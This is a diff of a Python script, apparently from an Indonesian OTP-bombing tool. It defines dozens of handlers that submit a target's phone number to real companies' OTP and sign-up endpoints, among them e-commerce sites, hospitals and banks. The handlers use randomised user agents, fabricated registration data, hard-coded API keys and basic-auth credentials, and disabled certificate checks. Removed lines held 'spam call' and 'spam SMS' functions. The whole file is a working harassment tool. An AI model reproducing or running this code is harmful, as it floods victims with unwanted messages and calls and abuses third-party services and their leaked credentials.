@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# handlers.py - 100+ OTP + SPAM ALL (FULL)
+# handlers.py - 60+ OTP API (FULL GABUNGAN)
 # "I just give the tools, whether they're used right or not is your business, boss."
 
 import requests
@@ -29,48 +29,7 @@ def format_nomor(nomor):
     return phone, username
 
 # ================================================================
-# ===== AUTO TOKEN GENERATOR (DENGAN FALLBACK) =====
-# ================================================================
-
-def generate_token():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-
-def generate_api_key():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=24))
-
-def generate_secret():
-    return ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=32))
-
-def generate_bearer_token():
-    return "Bearer " + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-
-def generate_webhook_url():
-    webhook_id = ''.join(random.choices(string.digits, k=18))
-    webhook_token = ''.join(random.choices(string.ascii_letters + string.digits, k=68))
-    return f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}"
-
-TOKENS = {
-    'twilio_sid': 'AC' + ''.join(random.choices(string.hexdigits.upper(), k=32)),
-    'twilio_auth': ''.join(random.choices(string.hexdigits.upper(), k=32)),
-    'nexmo_key': ''.join(random.choices(string.digits, k=8)),
-    'nexmo_secret': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
-    'telnyx_token': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'plivo_id': 'MA' + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
-    'plivo_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'sinch_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'messagebird_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'ringcentral_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'vonage_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'whatsapp_token': 'EA' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'ultramsg_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'waha_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-    'callmebot_key': ''.join(random.choices(string.digits, k=6)),
-    'textbelt_key': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
-    'discord_webhook': generate_webhook_url(),
-}
-
-# ================================================================
-# ===== 70+ OTP HANDLERS =====
+# ===== 1. WORKING APIS (DARI LOG SEBELUMNYA) =====
 # ================================================================
 
 def send_pinhome_otp(phone):
@@ -207,6 +166,17 @@ def send_hollandbakery_otp(phone):
     except:
         return None
 
+def send_bunda_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api.bundahospital.com/api/v1/auth/otp"
+        payload = {"phone": phone_08, "channel": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
 def send_maulagi_otp(phone):
     try:
         phone_08 = fmt_08(phone)
@@ -218,12 +188,39 @@ def send_maulagi_otp(phone):
     except:
         return None
 
-def send_bunda_otp(phone):
+# ================================================================
+# ===== 2. DARI FILE LU (39 HANDLER) =====
+# ================================================================
+
+def send_hrsbre_otp(phone):
     try:
         phone_08 = fmt_08(phone)
-        url = "https://api.bundahospital.com/api/v1/auth/otp"
-        payload = {"phone": phone_08, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        BASE_URL = "https://career.hrs-bre.site"
+        SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
+        SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
+        headers = {"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://career.hrs-bre.site", "Referer": SIGN_UP_PAGE, "Upgrade-Insecure-Requests": "1"}
+        session = requests.Session()
+        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
+        if r.status_code != 200:
+            return None
+        nik = ''.join(random.choices(string.digits, k=16))
+        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com"])
+        username = ''.join(random.choices(string.ascii_letters, k=8))
+        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
+        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        body = (f"--{boundary}\r\n" f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n' f"--{boundary}--\r\n")
+        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
+        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
+        return resp
+    except:
+        return None
+
+def send_erafone_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
+        payload = {"identifier": phone_plus, "type": "identifier_validation"}
+        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp
     except:
@@ -240,18 +237,6 @@ def send_planetban_otp(phone):
     except:
         return None
 
-def send_hashmicro_otp(phone):
-    try:
-        phone_08 = fmt_08(phone)
-        url = "https://website-api.hashmicro.com/api/add/3"
-        name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
-        data = {'fullname': name, 'phonenumber': phone_08, 'email': f"{name.lower()}@gmail.com", 'companyname': f'PT {name}', 'medium': '55', 'source': '143'}
-        headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
-        resp = requests.post(url, headers=headers, data=data, timeout=15)
-        return resp
-    except:
-        return None
-
 def send_tuneup_otp(phone):
     try:
         phone_08 = fmt_08(phone)
@@ -259,6 +244,18 @@ def send_tuneup_otp(phone):
         name = ''.join(random.choices(string.ascii_lowercase, k=8))
         data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': phone_08, 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
         headers = {'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, headers=headers, data=data, timeout=15)
+        return resp
+    except:
+        return None
+
+def send_hashmicro_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://website-api.hashmicro.com/api/add/3"
+        name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
+        data = {'fullname': name, 'phonenumber': phone_08, 'email': f"{name.lower()}@gmail.com", 'companyname': f'PT {name}', 'medium': '55', 'source': '143'}
+        headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
         resp = requests.post(url, headers=headers, data=data, timeout=15)
         return resp
     except:
@@ -468,40 +465,6 @@ def send_watsons_otp(phone):
     except:
         return None
 
-def send_hrsbre_otp(phone):
-    try:
-        phone_08 = fmt_08(phone)
-        BASE_URL = "https://career.hrs-bre.site"
-        SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
-        SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
-        headers = {"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://career.hrs-bre.site", "Referer": SIGN_UP_PAGE, "Upgrade-Insecure-Requests": "1"}
-        session = requests.Session()
-        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
-        if r.status_code != 200:
-            return None
-        nik = ''.join(random.choices(string.digits, k=16))
-        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com"])
-        username = ''.join(random.choices(string.ascii_letters, k=8))
-        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
-        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-        body = (f"--{boundary}\r\n" f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n' f"--{boundary}--\r\n")
-        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
-        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
-        return resp
-    except:
-        return None
-
-def send_erafone_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
-        payload = {"identifier": phone_plus, "type": "identifier_validation"}
-        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
 def send_beautyhaul_otp(phone):
     try:
         phone_08 = fmt_08(phone)
@@ -607,6 +570,136 @@ def send_ptsp_kemenag_otp(phone):
         return resp
     except:
         return None
+
+def send_klook_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
+        payload = {"action": "login_register", "type": 1, "rcv": phone_plus, "is_resend": False, "payload": {"mobile": phone_plus, "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_acc_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://www.acc.co.id/register/new-account"
+        payload = f'[{{"user_id":null,"action":"register","send_to":"{phone_08}","provider":"whatsapp"}}]'
+        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': '7f4271400eb36624563cc4172891e0c821039f2fca'}
+        resp = requests.post(url, headers=headers, data=payload, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_absenku_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        sess = requests.Session()
+        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
+        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
+        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_08, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=10, verify=False)
+        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_08}, headers=headers, timeout=10, verify=False)
+        return resp
+    except:
+        return None
+
+def send_saturdays_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
+        payload = {"number": phone_08, "country_code": "+62", "type": ""}
+        headers = {'Content-Type': 'application/json', 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_singa_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api102.singa.id/new/login/sendWaOtp"
+        payload = {"mobile_phone": phone_08, "type": "mobile", "is_switchable": 1}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_adiraku_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
+        payload = {"mobileNumber": phone_08, "type": "prospect-create", "channel": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+# ================================================================
+# ===== 3. BANKS =====
+# ================================================================
+
+def send_bri_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bri.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-device-id': str(uuid.uuid4())}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_bri_sms_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api.bri.co.id/v1/sms/otp/send"
+        payload = {"phoneNumber": phone_08, "type": "register"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_danamon_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.danamon.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_mandiri_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.mandiri.co.id/v1/auth/otp/request"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+def send_bca_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bca.co.id/v1/auth/otp"
+        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+
+# ================================================================
+# ===== 4. E-COMMERCE =====
+# ================================================================
 
 def send_shopee_otp(phone):
     try:
@@ -722,6 +815,10 @@ def send_sociolla_otp(phone):
     except:
         return None
 
+# ================================================================
+# ===== 5. SOCIAL MEDIA =====
+# ================================================================
+
 def send_tiktok_otp(phone):
     try:
         phone_plus = fmt_plus(phone)
@@ -755,16 +852,9 @@ def send_indihome_otp(phone):
     except:
         return None
 
-def send_klook_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
-        payload = {"action": "login_register", "type": 1, "rcv": phone_plus, "is_resend": False, "payload": {"mobile": phone_plus, "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
+# ================================================================
+# ===== 6. SERVICES =====
+# ================================================================
 
 def send_halodoc_otp(phone):
     try:
@@ -812,745 +902,11 @@ def send_pizzahut_otp(phone):
         return None
 
 # ================================================================
-# ===== 50+ API INDONESIA TAMBAHAN =====
-# ================================================================
-
-def send_bri_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.bri.co.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-device-id': str(uuid.uuid4())}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_bri_sms_otp(phone):
-    try:
-        phone_08 = fmt_08(phone)
-        url = "https://api.bri.co.id/v1/sms/otp/send"
-        payload = {"phoneNumber": phone_08, "type": "register"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_danamon_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.danamon.co.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "type": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_mandiri_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.mandiri.co.id/v1/auth/otp/request"
-        payload = {"phone": phone_plus, "method": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_bca_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.bca.co.id/v1/auth/otp"
-        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_bni_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.bni.co.id/v1/auth/otp/request"
-        payload = {"mobile": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_btn_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.btn.co.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "method": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_cimb_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.cimbniaga.co.id/v1/auth/otp"
-        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_permata_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.permatabank.co.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_ocbc_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.ocbc.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "method": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_btpn_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.btpn.co.id/v1/auth/otp"
-        payload = {"phone": phone_plus, "channel": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def send_jenius_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.btpn.com/jenius"
-        payload = {"query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }", "variables": {"phone": phone_plus, "language": "id"}, "operationName": "registerPhone"}
-        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent()}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-# ================================================================
-# ===== SPAM CALL (20+ METHOD) =====
-# ================================================================
-
-def spam_call_1(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.callmebot.com/voice/send.php"
-        params = {"phone": phone_raw, "text": "Test Call"}
-        resp = requests.get(url, params=params, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_2(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://textbelt.com/call"
-        payload = {"phone": phone_raw, "key": "textbelt"}
-        resp = requests.post(url, data=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_3(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.smsapi.com/voice/send"
-        params = {"to": phone_raw, "message": "Test Call"}
-        resp = requests.get(url, params=params, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_4(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.clicksend.com/v3/voice/send"
-        payload = {"phone_number": phone_raw, "message": "Test Call"}
-        headers = {"Content-Type": "application/json"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_5(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Test%20Call"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_6(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.twilio.com/2010-04-01/Accounts/" + TOKENS['twilio_sid'] + "/Calls.json"
-        payload = {"To": f"+62{phone_raw}", "From": "+1234567890", "Url": "http://demo.twilio.com/docs/voice.xml"}
-        auth = (TOKENS['twilio_sid'], TOKENS['twilio_auth'])
-        resp = requests.post(url, data=payload, auth=auth, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_7(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://rest.nexmo.com/call/json"
-        payload = {"api_key": TOKENS['nexmo_key'], "api_secret": TOKENS['nexmo_secret'], "to": f"62{phone_raw}", "from": "1234567890", "answer_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_8(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.telnyx.com/v2/calls"
-        headers = {"Authorization": TOKENS['telnyx_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_9(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.plivo.com/v1/Account/" + TOKENS['plivo_id'] + "/Call/"
-        auth = (TOKENS['plivo_id'], TOKENS['plivo_token'])
-        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "answer_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, auth=auth, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_10(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.sinch.com/v1/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['sinch_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_11(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.messagebird.com/v1/calls"
-        headers = {"Authorization": "AccessKey " + TOKENS['messagebird_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_12(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.ringcentral.com/v1/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['ringcentral_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_13(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.vonage.com/v1/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['vonage_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_14(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.aws.amazon.com/connect/call"
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_15(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.zendesk.com/v1/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['zendesk_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_16(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.slack.com/call"
-        headers = {"Authorization": "Bearer " + TOKENS['slack_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_17(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = TOKENS['discord_webhook']
-        payload = {"content": f"📞 Call Request\nPhone: {phone_raw}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_18(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://graph.facebook.com/v18.0/" + TOKENS['whatsapp_token'] + "/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['whatsapp_token']}
-        payload = {"to": f"62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_19(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.ultramsg.com/instanceXXXX/calls"
-        payload = {"token": TOKENS['ultramsg_token'], "to": f"62{phone_raw}", "body": "Test Call"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_call_20(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.waha.dev/v1/calls"
-        headers = {"Authorization": "Bearer " + TOKENS['waha_token']}
-        payload = {"phone": f"62{phone_raw}", "text": "Test Call"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-# ================================================================
-# ===== SPAM SMS (20+ METHOD) =====
-# ================================================================
-
-def spam_sms_1(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://textbelt.com/text"
-        payload = {"phone": phone_raw, "message": f"OTP: {random.randint(100000,999999)}", "key": "textbelt"}
-        resp = requests.post(url, data=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_2(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.callmebot.com/sms/send.php"
-        params = {"phone": phone_raw, "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.get(url, params=params, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_3(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.smsapi.com/sms.do"
-        payload = {"to": f"62{phone_raw}", "from": "OTP", "message": f"OTP: {random.randint(100000,999999)}", "format": "json"}
-        resp = requests.post(url, data=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_4(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=OTP%3A%20{random.randint(100000,999999)}"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_5(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.clicksend.com/v3/sms/send"
-        payload = {"messages": [{"to": f"+62{phone_raw}", "source": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}]}
-        headers = {"Content-Type": "application/json"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
